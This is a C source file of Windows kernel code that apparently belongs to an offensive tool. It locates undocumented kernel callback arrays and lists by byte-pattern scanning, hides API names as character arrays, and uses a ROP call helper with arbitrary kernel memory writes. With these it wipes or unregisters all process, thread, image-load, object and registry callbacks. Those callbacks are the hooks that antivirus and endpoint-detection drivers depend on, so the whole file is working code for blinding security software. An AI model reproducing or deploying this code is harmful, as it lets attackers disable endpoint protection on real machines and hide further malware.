#pragma once
#include"RopInit.h"


PVOID SearchMemory(PVOID pStartAddress, PVOID pEndAddress, PUCHAR pMemoryData, ULONG ulMemoryDataSize)
{
	PVOID pAddress = NULL;
	PUCHAR i = NULL;
	ULONG m = 0;

	for (i = (PUCHAR)pStartAddress; i < (PUCHAR)pEndAddress; i++)
	{
		for (m = 0; m < ulMemoryDataSize; m++)
		{
			if (*(PUCHAR)(i + m) != pMemoryData[m])
			{
				break;
			}
		}
		if (m >= ulMemoryDataSize)
		{
			pAddress = (PVOID)(i + ulMemoryDataSize);
			break;
		}
	}

	return pAddress;
}

BOOL IsMoreThanWin7()
{
	RTL_OSVERSIONINFOW osInfo = { 0 };
	RtlGetVersion(&osInfo);
	if (6 == osInfo.dwMajorVersion && osInfo.dwMinorVersion < 3)
	{
		return false;
	}
	return true;
}

// PsSetCreateProcessNotifyRoutine
BOOL DisablePsProcess()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsSetCreateProcessNotifyRoutine
	char PsSetCreateProcessNotifyRoutineStr[] = { 'P','s','S','e','t','C','r','e','a','t','e','P','r','o','c','e','s','s','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsSetCreateProcessNotifyRoutine = GetImgKernelFuncAddress((char*)PsSetCreateProcessNotifyRoutineStr);

	if (IsMoreThanWin7())
	{
		pSpecialData[0] = 0xE8;
		ulSpecialDataSize = 1;
		PVOID pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)pAddress;
		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

		pSpecialData[0] = 0x4C;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x2D;
		ulSpecialDataSize = 3;

		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)pAddress;
		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();

		for (int i = 0; i < 64; i++)
		{
			//ULONG64 CallBackAddress = NULL;
			//NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
			//if (NT_SUCCESS(status))
			//{
			//	if (CallBackAddress)
			//	{
			//		CallBackAddress &= 0xfffffffffffffff8;
			//		ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
			//		printf("CallBackAddress %llX \n", CallBackAddress);
			//	}
			//}
			ULONG64 zero = NULL;
			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
		}
	}
	else
	{
		pSpecialData[0] = 0xE9;
		ulSpecialDataSize = 1;
		PVOID pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
		{
			pSpecialData[0] = 0xE8;
			ulSpecialDataSize = 1;
			pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		}

		if (!pAddress)
			return false;

		lOffset = *(PLONG)pAddress;
		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

		pSpecialData[0] = 0x4C;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x35;
		ulSpecialDataSize = 3;

		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)pAddress;
		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();

		for (int i = 0; i < 64; i++)
		{
			//ULONG64 CallBackAddress = NULL;
			//NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
			//if (NT_SUCCESS(status))
			//{
			//	if (CallBackAddress)
			//	{
			//		CallBackAddress &= 0xfffffffffffffff8;
			//		ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
			//		printf("CallBackAddress %llX \n", CallBackAddress);
			//	}
			//}
			ULONG64 zero = NULL;
			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
		}
	}
	return true;
}

//PsSetLoadImageNotifyRoutine
void RemoveImageNotifyRoutine(PVOID pNotifyRoutineAddress)
{
	DWORD_PTR Status;
	PVOID Args[] = { KF_ARG(pNotifyRoutineAddress)};
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveLoadImageStr[] = { 'P','s','R','e','m','o','v','e','L','o','a','d','I','m','a','g','e','N','o','t','i','f','y','R','o','u','t','i','n','e','\0'};
	RopCall((char*)PsRemoveLoadImageStr, Args, 1, KF_RET(&Status));
}
BOOL DisablePsImg()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveLoadImageStr[] = { 'P','s','R','e','m','o','v','e','L','o','a','d','I','m','a','g','e','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsRemoveLoadImage = GetImgKernelFuncAddress((char *)PsRemoveLoadImageStr);

	pSpecialData[0] = 0x48;
	pSpecialData[1] = 0x8D;
	pSpecialData[2] = 0x0D;
	ulSpecialDataSize = 3;

	PVOID pAddress = SearchMemory((PVOID)PsRemoveLoadImage,(PVOID)((PUCHAR)PsRemoveLoadImage + 0xFF),pSpecialData, ulSpecialDataSize);
	if (!pAddress)
		return false;
	lOffset = *(PLONG)pAddress;
	ULONG64 pPspLoadImageNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	if (!pPspLoadImageNotifyRoutine)
		return false;

	for (int i = 0; i < 64; i++)
	{
		ULONG64 CallBackAddress = NULL;
		NTSTATUS status = ReadWriteVirtualAddressValue(pPspLoadImageNotifyRoutine + i * sizeof(ULONG64),sizeof(ULONG64),&CallBackAddress,true);
		if (NT_SUCCESS(status))
		{
			if (CallBackAddress)
			{
				CallBackAddress &= 0xfffffffffffffff8;
				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
				if (CallBackAddress)
					RemoveImageNotifyRoutine((PVOID)CallBackAddress);
			}
		}
	}

	return true;
}

// PsSetCreateThreadNotifyRoutine
void  PsRemoveCreateThreadRoutine(PVOID pNotifyRoutineAddress)
{
	DWORD_PTR Status;
	PVOID Args[] = { KF_ARG(pNotifyRoutineAddress) };
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveCreateThreadStr[] = { 'P','s','R','e','m','o','v','e','C','r','e','a','t','e','T','h','r','e','a','d','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	RopCall((char*)PsRemoveCreateThreadStr, Args, 1, KF_RET(&Status));
}
BOOL DisablePsThread()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsRemoveCreateThreadNotifyRoutine
	char PsRemoveCreateThreadStr[] = { 'P','s','R','e','m','o','v','e','C','r','e','a','t','e','T','h','r','e','a','d','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsRemoveCreateThread = GetImgKernelFuncAddress((char*)PsRemoveCreateThreadStr);

	pSpecialData[0] = 0x48;
	pSpecialData[1] = 0x8D;
	pSpecialData[2] = 0x0D;
	ulSpecialDataSize = 3;

	PVOID pAddress = SearchMemory((PVOID)PsRemoveCreateThread, (PVOID)((PUCHAR)PsRemoveCreateThread + 0xFF), pSpecialData, ulSpecialDataSize);
	if (!pAddress)
		return false;
	lOffset = *(PLONG)pAddress;
	ULONG64 pPspCreateThreadRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	if (!pPspCreateThreadRoutine)
		return false;

	for (int i = 0; i < 64; i++)
	{
		ULONG64 CallBackAddress = NULL;
		NTSTATUS status = ReadWriteVirtualAddressValue(pPspCreateThreadRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
		if (NT_SUCCESS(status))
		{
			if (CallBackAddress)
			{
				CallBackAddress &= 0xfffffffffffffff8;
				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
				if (CallBackAddress)
					PsRemoveCreateThreadRoutine((PVOID)CallBackAddress);
			}
		}
	}
	return true;
}

//ObRegisterCallbacks
void RemoveObCallback(PVOID RegistrationHandle)
{
	DWORD_PTR Status = NULL;
	PVOID Args[] = { KF_ARG(RegistrationHandle)};
	//ObUnRegisterCallbacks
	char ObUnRegisterCallbacksStr[] = { 'O','b','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','s','\0' };
	RopCall((char*)ObUnRegisterCallbacksStr, Args, 1, KF_RET(&Status));
}
BOOL DisableObCallBack()
{
	//PsProcessType
	char ProcessTypeStr[] = { 'P','s','P','r','o','c','e','s','s','T','y','p','e','\0' };
	ULONG64 PsProcessType = GetKernelFuncAddress((char*)ProcessTypeStr);

	//PsThreadType
	char ThreadTypeStr[] = { 'P','s','T','h','r','e','a','d','T','y','p','e','\0' };
	ULONG64 PsThreadType = GetKernelFuncAddress((char*)ThreadTypeStr);


	ULONG64 proObj = NULL, threadObj = NULL;

	ReadWriteVirtualAddressValue(PsProcessType, sizeof(ULONG64), &proObj, true);
	ReadWriteVirtualAddressValue(PsThreadType, sizeof(ULONG64), &threadObj, true);

	if (!threadObj || !proObj)
		return false;

	ULONG listOffset = 0xC8;
	if (!IsMoreThanWin7())
		listOffset = 0xC0;

	LIST_ENTRY CallbacProckList = { 0 };
	LIST_ENTRY CallbacThreadkList = { 0 };
	ReadWriteVirtualAddressValue(proObj + listOffset, sizeof(LIST_ENTRY), &CallbacProckList, true);
	ReadWriteVirtualAddressValue(threadObj + listOffset, sizeof(LIST_ENTRY), &CallbacThreadkList, true);


	if (!CallbacProckList.Flink || !CallbacThreadkList.Flink)
		return false;

	ULONG count = 0;
	ULONG64 Handles[0x100] = { 0 };

	if ((ULONG64)CallbacProckList.Flink != proObj + listOffset)//isEmptylist
	{
		OB_CALLBACK ObProcCallback = { 0 };
		//ULONG64 pPreObProcCallback = (ULONG64)CallbacProckList.Flink;
		ReadWriteVirtualAddressValue((ULONG64)CallbacProckList.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
		do
		{
			if (ObProcCallback.ListEntry.Flink && ObProcCallback.ObHandle)
			{
				Handles[count++] = (ULONG64)ObProcCallback.ObHandle;

				//会蓝屏buffer over flow
				//if (ObProcCallback.ObHandle)
				//	 RemoveObCallback(ObProcCallback.ObHandle);
				//这里是pre和post直接赋值为0
				//ULONG64 zero = 0;
				//ReadWriteVirtualAddressValue(pPreObProcCallback + 0x28, sizeof(ULONG64), &zero, false);
				//ReadWriteVirtualAddressValue(pPreObProcCallback + 0x30, sizeof(ULONG64), &zero, false);
				//pPreObProcCallback = (ULONG64)ObProcCallback.ListEntry.Flink;
				ReadWriteVirtualAddressValue((ULONG64)ObProcCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
			}
		} while (CallbacProckList.Flink != ObProcCallback.ListEntry.Flink);
	}
	
	if ((ULONG64)CallbacThreadkList.Flink != threadObj + listOffset)//isEmptylist
	{
		OB_CALLBACK ObThreadCallback = { 0 };
		//ULONG64 pPreObThreadCallback = (ULONG64)CallbacThreadkList.Flink;
		ReadWriteVirtualAddressValue((ULONG64)CallbacThreadkList.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
		do
		{
			if (ObThreadCallback.ListEntry.Flink && ObThreadCallback.ObHandle)
			{
				Handles[count++] = (ULONG64)ObThreadCallback.ObHandle;

				//if (ObThreadCallback.ObHandle)
				//	RemoveObCallback(ObThreadCallback.ObHandle);
				//ULONG64 zero = 0;
				//ReadWriteVirtualAddressValue(pPreObThreadCallback + 0x28, sizeof(ULONG64), &zero, false);
				//ReadWriteVirtualAddressValue(pPreObThreadCallback + 0x30, sizeof(ULONG64), &zero, false);
				//pPreObThreadCallback = (ULONG64)ObThreadCallback.ListEntry.Flink;
				ReadWriteVirtualAddressValue((ULONG64)ObThreadCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
			}
		} while (CallbacThreadkList.Flink != ObThreadCallback.ListEntry.Flink);
	}

	while (count)
		RemoveObCallback((PVOID)Handles[--count]);

	return true;
}

//CmRegisterCallback
void CmUnRegisterCallback(PVOID RegistrationHandle)
{
	DWORD_PTR Status = NULL;
	PVOID Args[] = { KF_ARG(RegistrationHandle) };
	//CmUnRegisterCallback
	char CmUnRegisterCallbackStr[] = { 'C','m','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','\0' };
	RopCall((char*)CmUnRegisterCallbackStr, Args, 1, KF_RET(&Status));
}
BOOL DisableCm()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	LONG lSpecialOffset = 0;
	ULONG64 pCallbackListHead = NULL;

	//CmUnRegisterCallback
	char CmUnRegisterCallbackStr[] = { 'C','m','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','\0' };
	ULONG64 CmUnRegisterCallbackfunc = GetImgKernelFuncAddress((char*)CmUnRegisterCallbackStr);

	
	if (!IsMoreThanWin7())
	{
		pSpecialData[0] = 0x48;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x54;
		ulSpecialDataSize = 3;
		lSpecialOffset = 5;

		PVOID pAddress = SearchMemory((PVOID)CmUnRegisterCallbackfunc, (PVOID)((PUCHAR)CmUnRegisterCallbackfunc + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)((PUCHAR)pAddress + lSpecialOffset);
		pCallbackListHead = (ULONG64)((PUCHAR)pAddress + lSpecialOffset + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	}
	else
	{
		pSpecialData[0] = 0x48;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x0D;
		ulSpecialDataSize = 3;

		PVOID pAddress = SearchMemory((PVOID)CmUnRegisterCallbackfunc, (PVOID)((PUCHAR)CmUnRegisterCallbackfunc + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)(pAddress);
		pCallbackListHead = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	}

	if (!pCallbackListHead)
		return false;

	CM_NOTIFY_ENTRY NotifyEntry = { 0 };
	ReadWriteVirtualAddressValue(pCallbackListHead, sizeof(CM_NOTIFY_ENTRY), &NotifyEntry, true);
	if (!NotifyEntry.ListEntryHead.Flink)
		return false;

	ULONG count = 0;
	ULONG64 Handles[0x100] = { 0 };
	if (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink)//isEmptylist
	{
		do
		{
			ReadWriteVirtualAddressValue((ULONG64)NotifyEntry.ListEntryHead.Flink, sizeof(CM_NOTIFY_ENTRY), &NotifyEntry, true);

			if (NotifyEntry.ListEntryHead.Flink && NotifyEntry.Function && NotifyEntry.Cookie.QuadPart)
				Handles[count++] = (ULONG64)NotifyEntry.Cookie.QuadPart;
			
		} while (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink);
	}

	while (count)
		CmUnRegisterCallback((PVOID)Handles[--count]);

	return true;
}